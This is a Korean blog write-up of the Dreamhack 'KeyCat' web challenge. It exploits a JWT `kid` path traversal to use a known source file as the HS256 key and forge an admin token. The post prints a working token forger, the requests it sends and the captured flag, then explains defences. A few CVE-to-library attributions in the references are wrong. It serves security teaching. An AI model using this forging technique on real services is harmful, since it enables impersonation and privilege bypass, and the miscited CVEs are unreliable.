---
layout: post
title:  "Dreamhack 워게임 KeyCat 풀이 — JWT kid path traversal로 우리가 아는 파일을 HS256 키로 바꿔치기"
date:   2026-05-16 15:00:00 +0900
categories: security web wargame dreamhack writeup jwt path-traversal
---

## 들어가며

Dreamhack 웹해킹 워게임 **KeyCat** (난이도 Gold 3) 풀이입니다. 사이버보안 입문 학생이 한 번에 익혀야 할 **JWT `kid` 헤더 path traversal** + **알려진-내용 파일을 HS256 키로 재활용해 임의 JWT 위조** 의 정공법을 보여주는 정통 JWT 문제.

문제 설명:

> cat loves cats

스포일러로 결론 — 단일 JWT 한 개로 끝.

```python
# kid='../app.js' → 서버가 keys/../app.js = app.js 를 키로 읽음
# 우리는 로컬에 같은 app.js 가 있으므로 동일 키로 HS256 sign 가능
header = {'alg':'HS256', 'typ':'JWT', 'kid':'../app.js'}
payload = {
    'filename': 'flag00.txt flag01.txt ... flagff.txt',   # 256개 후보를 한 줄에
    'username': 'cat_master'                                # admin 권한
}
token = HS256(header, payload, key=app.js_content)
```

이 토큰 하나로 `/cat/flag` 와 `/cat/admin` 둘 다 통과 → flag 두 조각을 한 번에 수확.

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

### 1-1. 핵심 함수 — `jwt.js` 의 verify

```javascript
const verify = (token) => {
    let jwt_data, error;
    jwt.verify(token, (header, cb) => {
        cb(null, fs.readFileSync(PATH_PREFIX + '/' + header.kid, 'utf-8'));
    }, { algorithm: 'HS256' }, (err, data) => {
        error = err; jwt_data = data;
    });
    return { jwt_data, err: error };
};
```

**JWT 의 `kid` (key id) 헤더가 그대로 파일 경로에 연결** 된다. `kid='../app.js'` 면 `fs.readFileSync('keys/../app.js')` = `/home/cat/deploy/app.js` 를 키로 사용. **path traversal 그대로**.

이 패턴은 JWT 의 클래식 함정. 키 식별자 (kid) 를 신뢰해서 파일 시스템에 그대로 매핑하면 안 되는데, 본 문제에서는 정확히 그렇게 한다.

### 1-2. 두 개의 flag 채널 — `routes/cat.js`

```javascript
router.get('/flag', Auth, (req, res) => {
    if (req.filename !== undefined && req.filename.indexOf(FLAG_FILE_NAME) !== -1) {
        return res.status(200).send(`🙀 ${FLAG_CONTENT_1}`);
    }
    ...
});

router.get('/admin', Auth, (req, res) => {
    if (req.username !== undefined && req.username === 'cat_master') {
        return res.status(200).send(`Hello Cat Master😸 this is for you ${FLAG_CONTENT_2}`);
    }
    ...
});
```

- `/cat/flag` — JWT 의 `filename` 이 `FLAG_FILE_NAME` 을 **substring 으로 포함** 하면 flag 의 앞 34글자.
- `/cat/admin` — JWT 의 `username` 이 `'cat_master'` 이면 flag 의 뒤 34글자.

### 1-3. flag 파일명의 비밀 — `entrypoint.sh`

```bash
export FLAG_CONTENT_1=$(cat /home/cat/deploy/flag.txt | cut -c 1-34)
export FLAG_CONTENT_2=$(cat /home/cat/deploy/flag.txt | cut -c 35-68)

FLAG=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 2 | head -n 1)

mv /home/cat/deploy/flag.txt /home/cat/deploy/flag$FLAG.txt
export FLAG_FILE_NAME=flag$FLAG.txt
```

flag 파일이 **`flag<2-char-hex>.txt`** 라는 랜덤 이름으로 rename. 256 후보. 우리는 정확한 이름을 모름.

### 1-4. 결정적 단서 두 가지

1. **`req.filename.indexOf(FLAG_FILE_NAME) !== -1`** — substring 검사. 즉 우리가 256개 후보를 모두 한 줄에 박은 긴 문자열을 JWT 의 `filename` 에 넣으면 정확한 이름도 그 안에 포함된다.
2. **`/` (index.js) 의 `?fn=` 파라미터** 도 `sign(fn)` 호출 → `keys/fn` 을 키로 사용해 JWT 생성. 또 다른 path traversal. 우리가 직접 forge 하면 이건 필요 없음.

## 2. 익스플로잇 — 단일 JWT 한 개

### 2-1. 키 후보 — 우리가 내용을 아는 파일

ZIP 의 `deploy/` 안 파일들은 **서버의 `/home/cat/deploy/` 와 동일** (Dockerfile 의 `COPY --chown=...` 그대로).

후보:

- `deploy/app.js` (우리가 알고 있는 코드)
- `deploy/jwt.js`
- `deploy/package.json`
- `deploy/Dockerfile`
- `deploy/entrypoint.sh`
- `deploy/middleware/auth.js`
- `deploy/routes/index.js`, `deploy/routes/cat.js`

ZIP 의 `keys/key1`, `keys/key2`, `keys/key3` 는 `***REDACTED***` 로 비어 있어 서버 실제 값과 다름. 못 씀.

위 후보 중 아무거나 골라 키로 사용. `app.js` 가 가장 짧고 안전.

### 2-2. JWT 위조

```python
import hmac, hashlib, base64, json

with open('deploy/app.js', 'rb') as f:
    key = f.read()

def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def make_jwt(header, payload, key):
    h = b64url(json.dumps(header, separators=(',',':')).encode())
    p = b64url(json.dumps(payload, separators=(',',':')).encode())
    msg = (h + '.' + p).encode()
    sig = hmac.new(key, msg, hashlib.sha256).digest()
    return h + '.' + p + '.' + b64url(sig)

# 256개 후보 filename 모두 한 줄에
candidates = ' '.join(f'flag{i:02x}.txt' for i in range(256))

header = {'alg':'HS256', 'typ':'JWT', 'kid':'../app.js'}
payload = {'filename': candidates, 'username': 'cat_master'}

token = make_jwt(header, payload, key)
```

토큰 길이 ~4KB. HTTP cookie 크기 제한 (8KB) 안에 안전.

### 2-3. 두 endpoint 동시 수확

```python
import urllib.request

for path in ('/cat/flag', '/cat/admin'):
    req = urllib.request.Request(f"{SERVER}{path}",
                                  headers={'Cookie': f'session={token}'})
    print(path, urllib.request.urlopen(req).read().decode())
```

결과:

```
/cat/flag   🙀🙀🙀🙀🙀🙀 DH{90b12bc264e96c4bec8ebef17cf4e45
/cat/admin  Hello Cat Master😸 this is for you 729242b7b14835a0255ee340d92b9c19d}
```

두 조각 concat:

```
DH{90b12bc264e96c4bec8ebef17cf4e45 + 729242b7b14835a0255ee340d92b9c19d}
= DH{90b12bc264e96c4bec8ebef17cf4e45729242b7b14835a0255ee340d92b9c19d}
```

flag: `DH{90b12bc264e96c4bec8ebef17cf4e45729242b7b14835a0255ee340d92b9c19d}` ✓

## 3. 취약점 해설 — JWT 의 가장 흔한 실수 두 가지

### 3-1. `kid` 헤더 신뢰

JWT 의 `kid` 는 **key identifier** — 다중 키 환경에서 어떤 키로 sign/verify 했는지 알려주는 메타데이터. **공격자가 제어 가능한 헤더 값** 이라는 점이 핵심.

위험 패턴 :

```javascript
// 위험: kid 를 그대로 파일/DB 경로에 사용
const key = fs.readFileSync('/keys/' + header.kid);          // ← path traversal
const key = db.query("SELECT key FROM keys WHERE id=" + header.kid);  // ← SQLi
const key = redis.get('jwt_key_' + header.kid);              // ← key injection
```

이런 패턴이 보이면 즉시 위험 신호.

올바른 방어 :

```javascript
const ALLOWED_KIDS = new Set(['key1', 'key2', 'key3']);
if (!ALLOWED_KIDS.has(header.kid)) throw new Error('Invalid kid');
const key = fs.readFileSync('/keys/' + header.kid);
```

### 3-2. 키 파일이 다른 코드와 같은 공간에 있음

본 문제는 keys 디렉터리가 `deploy/keys/` 라 path traversal 한 번으로 다른 source file 에 도달 가능. **키 디렉터리는 별도 격리** 가 원칙.

```
/etc/myapp/keys/     # 키 전용 디렉터리, mode 0600, owner != app user
/var/lib/myapp/code/ # 코드
```

또는 클라우드 secret manager (AWS Secrets Manager, HashiCorp Vault) 사용. 파일 시스템 의존 자체를 없앤다.

### 3-3. 같은 클래스의 실무 사례

- **CVE-2017-11424 (jose4j)** — kid header injection 으로 임의 키 파일 로딩.
- **JWT.io 의 None algorithm bypass** — `alg=none` 으로 서명 없이 통과 (본 문제는 `algorithm:'HS256'` 명시라 해당 안 됨).
- **RSA → HMAC confusion** — `alg=HS256` 으로 변경 후 RSA public key 를 HMAC 키로 사용. 본 문제는 아니지만 유명.
- **CTF 단골 패턴** : `kid` 를 SQL 또는 file path 로 사용하는 모든 코드.

### 3-4. 위험성

- 본 문제는 단순 권한 우회지만, 같은 패턴으로 **임의 사용자 impersonation, admin 권한 획득, 임의 endpoint 접근** 가능.
- 키가 코드 베이스 안에 있으면 git push 한 순간 GitHub 에 노출. 키 회전 비용 + 보안 사고.

### 3-5. 올바른 방어

1. **`kid` 화이트리스트** — 위 예시.
2. **키 디렉터리 격리** — 코드와 분리, 권한 minimize.
3. **JWT 라이브러리의 `complete: true`** + 수동 헤더 검증.
4. **알고리즘 명시** — `algorithms: ['RS256']` 형태로 단일 알고리즘만 허용. None / 다른 알고리즘 차단.
5. **키 회전** — 키가 노출되면 즉시 회전 가능한 시스템.

## 4. 정리 — 입문자가 가져갈 교훈

- JWT 의 `kid` 헤더는 **공격자가 제어 가능**. 파일/DB/Redis 키로 그대로 쓰면 즉시 path traversal / injection.
- 키 파일이 **코드와 같은 디렉터리에 있으면** path traversal 한 줄로 다른 알려진 파일을 키로 재활용 가능. 우리가 내용을 아는 파일이면 HS256 key 로 활용해 임의 JWT 위조.
- 서버에서 검증하는 모든 필드 (`filename`, `username`, `role`, …) 는 JWT payload 안에 우리가 자유롭게 박을 수 있다. **임의 권한 행사** 가능.
- substring 매칭 (`indexOf`, `includes`) 으로 권한 체크하는 패턴은 항상 **공격자가 모든 후보를 한 줄에 박아** 우회 가능.
- 방어: kid 화이트리스트 + 키 디렉터리 격리 + 알고리즘 명시 + JWT signature 라이브러리 최신 버전.

같은 카테고리의 다음 단계로 **JWT alg=none bypass**, **RSA→HMAC confusion**, **CVE-2018-0114 (jose4j key injection)** 같은 자료를 보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 처음에 keys/key1, key2, key3 의 내용 추측하려고 함

ZIP 안의 `keys/key1` 이 `***REDACTED***` 14바이트라서 한 순간 "혹시 서버도 그대로 두면 짧은 키라 brute force 가능?" 고민. 곧 entrypoint 같은 환경 초기화는 없고 Docker COPY 가 ZIP 의 redacted 키를 그대로 가져갈 거라는 잘못된 가정을 했다.

확인해보니 서버의 keys 는 redact 안 된 진짜 값 — 추측 불가.

**회고**: ZIP 의 placeholder (`***REDACTED***`, `[**FLAG**]`, `[**REDACTED**]`) 같은 패턴은 거의 항상 "서버에서는 다른 값" 이라는 의미. 무조건 다른 우회 경로를 찾자. **placeholder 의 내용을 추측하는 시도는 시간 낭비**.

### 실패 2. `?fn=` 으로 직접 sign 받아 사용하려고 함

`/?fn=../app.js` 로 서버한테 sign 요청 → 서버가 app.js 를 키로 sign 한 JWT 를 돌려줌. 이 JWT 의 payload 는 `{filename: '../app.js', username: 'dreamhack'}`. **username 이 항상 'dreamhack' 이라 cat_master 가 될 수 없음.**

`/cat/flag` 에는 통과 가능 (filename 에 `../app.js` 만 들어가서 FLAG_FILE_NAME 미포함이라 실패) → admin 에는 절대 통과 불가 (username 고정).

해결: **JWT 를 직접 위조**. 서버의 sign 함수 의존 없이, key 만 알면 우리가 임의 payload 로 HS256 sign 가능. JWT 의 기본 원리.

**회고**: JWT 위조는 **키 → payload → 서명** 세 단계. 키만 얻으면 payload 는 우리가 임의. 서버의 sign 함수에 의존할 필요 없다.

### 실패 3. 256개 후보를 별도 JWT 로 보낼 뻔

256번 시도하면 brute-force 영역. 사용자 규칙으로 금지. 대신 **한 JWT 에 256개 후보를 모두 박는** 방법을 떠올림. JWT payload 크기 제한이 없으니 (cookie 8KB 한도) 256개 filename concat 해도 충분.

**회고**: substring 매칭 검사는 우회 시 **모든 후보를 한 줄에** 박으면 끝. JWT/JSON payload 는 크기 제한이 (실용적) 거의 없음. 256 enumeration 도 단일 토큰으로 끝낼 수 있다.

### 실패 4. `app.js` 의 line ending 차이 걱정

처음에 "내 로컬 app.js 와 서버 app.js 의 line ending (CRLF vs LF) 이 다르면 키가 다른 바이트라 sign 실패" 라고 걱정. 다행히 Docker COPY 는 line ending 변경 안 함. ZIP 도 unzip 시 line ending 보존. 그래서 그대로 통과.

**회고**: 텍스트 파일을 HS256 키로 쓸 때 **CRLF / LF, trailing newline, BOM** 같은 미세한 차이가 키를 깰 수 있다. 만약 한 번에 안 통하면 line ending 변형도 시도. 가장 안전한 건 **binary mode** 로 읽어서 그대로 사용 (`open('app.js', 'rb')`).
